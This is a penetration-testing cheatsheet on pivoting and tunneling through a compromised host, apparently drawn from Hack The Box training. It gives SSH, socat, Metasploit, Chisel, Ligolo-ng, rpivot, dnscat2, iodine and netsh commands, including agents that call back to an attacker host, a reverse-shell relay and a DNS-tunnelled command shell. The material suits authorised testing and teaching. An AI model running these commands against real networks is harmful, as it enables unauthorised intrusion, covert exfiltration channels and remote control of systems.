---
title: "Pivoting & Tunneling Cheatsheet"
type: cheatsheet
tags: [cheatsheet, htb, network, pivoting, port-forwarding, tunneling]
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-pivoting, git-htb-writeups]
---

# Pivoting & Tunneling Cheatsheet

## Reconnaissance on Pivot Host

```bash
# Linux — discover connected networks
ip route
ifconfig
arp -a
cat /etc/hosts

# Windows
ipconfig /all
route print
arp -a
```

---

## SSH Tunneling

### Prep — Tunnel User on Attacker Machine

```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
# Enable GatewayPorts in /etc/ssh/sshd_config if needed for -R to bind on all interfaces
```

### Local Port Forward — pull internal service to attacker

```bash
# attacker:LOCAL_PORT → INTERNAL_HOST:REMOTE_PORT via PIVOT
ssh -L <local_port>:<internal_host>:<remote_port> <user>@<pivot_ip> -N -f

# Example: MySQL on internal host → localhost:1234
ssh -L 1234:172.16.5.25:3306 ubuntu@10.129.202.64 -N -f

# Example: internal web → localhost:8080
ssh -L 8080:172.16.5.25:80 ubuntu@10.129.202.64 -N -f

# Multiple forwards
ssh -L 1234:172.16.5.25:3306 -L 8080:172.16.5.25:80 ubuntu@10.129.202.64 -N -f
```

### Remote Port Forward — push from pivot back to attacker (bypasses inbound firewall)

```bash
# From PIVOT — exposes INTERNAL_HOST:REMOTE_PORT as attacker:REMOTE_PORT
ssh -R <remote_port>:<internal_host>:<internal_port> <user>@<attacker_ip> -N

# Example: expose internal RDP → attacker:3389
ssh tunneluser@10.10.14.18 -R 3389:172.16.5.25:3389 -N

# Windows pivot using plink.exe
plink.exe -ssh -l tunneluser -pw <pass> <attacker_ip> -R 3389:172.16.5.25:3389 -N
```

### Dynamic Port Forward — SOCKS proxy through pivot

```bash
# From attacker — SOCKS proxy on local port 9050
ssh -D 9050 ubuntu@10.129.202.64 -N -f

# Reverse dynamic (from Windows pivot back to attacker)
ssh tunneluser@<attacker_ip> -R 9050 -N
# Windows plink.exe equivalent
plink.exe -ssh -l tunneluser -pw <pass> <attacker_ip> -R 9050 -N
```

---

## proxychains

### /etc/proxychains.conf

```ini
# Single hop
strict_chain
proxy_dns
[ProxyList]
socks5  127.0.0.1 9050

# Double hop
dynamic_chain
proxy_dns
[ProxyList]
socks5  127.0.0.1 9050
socks5  127.0.0.1 9051
```

### Usage

```bash
proxychains -q nmap -Pn -sT -p 22,80,443,445,3389 172.16.5.25
proxychains nmap -v -sn 172.16.5.1-254 --open           # host discovery
proxychains ssh -i id_rsa ubuntu@172.16.5.25             # second hop
proxychains xfreerdp /v:172.16.5.25 /u:Administrator
proxychains curl -s http://172.16.5.25/
proxychains impacket-smbclient //172.16.5.25/share -U user%pass
proxychains impacket-wmiexec user:'pass'@172.16.5.25
proxychains crackmapexec smb 172.16.5.0/24 -u user -p pass
proxychains msfconsole
```

> Always use `-Pn -sT` with nmap through proxychains — ICMP and SYN scans do not work.

---

## socat Relay

```bash
# Forward connections to PIVOT:LISTEN_PORT → DEST_HOST:DEST_PORT
socat TCP4-LISTEN:<listen_port>,fork TCP4:<dest_host>:<dest_port>

# Example: relay RDP
socat TCP4-LISTEN:3389,fork TCP4:172.16.5.25:3389

# Example: relay reverse shell from target → attacker listener
socat TCP4-LISTEN:8443,fork TCP4:<attacker_ip>:8443

# Open Windows firewall rule before listening
netsh advfirewall firewall add rule name="pivot" dir=in action=allow protocol=TCP localport=<port>
```

---

## Metasploit Pivoting

### autoroute

```bash
# In Meterpreter session
run autoroute -s 172.16.5.0/23
run autoroute -p                    # print routes

# Or from msf console
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

# Manual route management
route add 172.16.5.0/23 <session_id>
route print
route flush
```

### SOCKS Proxy

```bash
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 9050
set VERSION 5
run -j
jobs                               # verify running
```

### Meterpreter portfwd

```bash
portfwd add -l <local_port> -p <remote_port> -r <remote_host>
# Example: attacker:3300 → 172.16.5.25:3389
portfwd add -l 3300 -p 3389 -r 172.16.5.25

# Reverse portfwd (pivot listens, sends to attacker)
portfwd add -R -l 8081 -p 8081 -L <attacker_ip>

portfwd list
portfwd delete -l 3300 -p 3389 -r 172.16.5.25
portfwd flush
```

### TCP Port Scan Through Route

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.1-254
set PORTS 22,80,443,445,3306,3389,5985
run
```

---

## Ligolo-ng

```bash
# ATTACKER — create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# ATTACKER — start proxy (listens on :11601)
./proxy -selfcert                           # or -certfile/-keyfile

# PIVOT HOST — run agent
./agent -connect <attacker_ip>:11601 -ignore-cert          # Linux
agent.exe -connect <attacker_ip>:11601 -ignore-cert        # Windows

# ATTACKER — in ligolo console
session                                     # list agents
# (select agent)
sudo ip route add 172.16.5.0/24 dev ligolo # route internal subnet
start                                       # start tunnel

# Add listener on agent to reach pivot host's own ports
listener_add --addr 0.0.0.0:<port> --to 127.0.0.1:<port>
```

After `start`, use tools directly: `nmap -Pn -sV 172.16.5.25` — no proxychains needed.

---

## Chisel

```bash
# ATTACKER — start server
./chisel server -v -p 1080 --reverse

# PIVOT — reverse SOCKS proxy (SOCKS5 on attacker:1080)
./chisel client <attacker_ip>:1080 R:socks           # Linux
chisel.exe client <attacker_ip>:1080 R:socks         # Windows

# PIVOT — single reverse port forward
./chisel client <attacker_ip>:1080 R:8080:172.16.5.25:80

# Bind mode — server on pivot, client on attacker
./chisel server -v -p 8080 --socks5                  # on pivot
./chisel client <pivot_ip>:8080 socks                # on attacker
```

proxychains config for Chisel:

```ini
[ProxyList]
socks5  127.0.0.1 1080
```

---

## rpivot

```bash
# ATTACKER
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# PIVOT
python2 client.py --server-ip <attacker_ip> --server-port 9999

# Through corporate NTLM proxy
python2 client.py --server-ip <attacker_ip> --server-port 9999 \
  --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 \
  --domain CORP --username user --password pass
```

proxychains config: `socks4  127.0.0.1 9050`

---

## dnscat2

```bash
# ATTACKER — start server
ruby dnscat2.rb --dns host=<attacker_ip>,port=53,domain=example.com --no-cache

# PIVOT
./dnscat --secret=<secret> example.com
dnscat2-v0.07-client-win32.exe --secret <secret> example.com

# In dnscat2 server console
window -i 1
listen 127.0.0.1:8080 172.16.5.25:80   # port forward
exec cmd.exe                             # shell
```

## iodine (DNS tunneling)

```bash
# ATTACKER — start server (requires DNS delegation for tunnel.domain.com)
iodined -f -c -P password 10.0.0.1 tunnel.domain.com

# PIVOT — connect client
iodine -f -P password tunnel.domain.com
# Creates tun0 interface on both ends; attacker is 10.0.0.1, pivot is 10.0.0.2

# SSH through iodine tunnel
ssh -D 1080 user@10.0.0.1
```

---

## Windows netsh Port Proxy

```cmd
# Add forward rule (requires Administrator)
netsh interface portproxy add v4tov4 listenport=<local_port> listenaddress=0.0.0.0 connectport=<dest_port> connectaddress=<dest_host>

# Example: forward port 8080 → internal host 172.16.5.25:80
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.5.25

# Show active rules
netsh interface portproxy show v4tov4

# Remove a rule
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Allow through firewall
netsh advfirewall firewall add rule name="pivot 8080" dir=in action=allow protocol=TCP localport=8080
```

---

## Quick Reference — Tool Selection

| Situation | Tool |
|---|---|
| SSH available on pivot (Linux/modern Windows) | `ssh -L / -R / -D` |
| No SSH, socat available | `socat` relay |
| Windows pre-2019 (no OpenSSH) | `plink.exe` |
| Only HTTP/HTTPS outbound allowed | Chisel |
| Only DNS outbound allowed | dnscat2 |
| Need transparent routing (no proxychains) | Ligolo-ng |
| Already have Meterpreter session | `autoroute` + `socks_proxy` or `portfwd` |
| Need SOCKS on Windows without tools | `ssh tunneluser@attacker -R 9050 -N` |
| Windows with admin rights, no extra tools | `netsh portproxy` |
| Corporate NTLM proxy blocking egress | rpivot with NTLM support |

---

## See Also

- [[pivoting-tunneling]] — full technique notes
- [[metasploit]] — MSF pivoting details
- [[wiki/cheatsheets/nmap]] — scanning through proxychains
- [[reverse-shells]] — catching shells through pivots
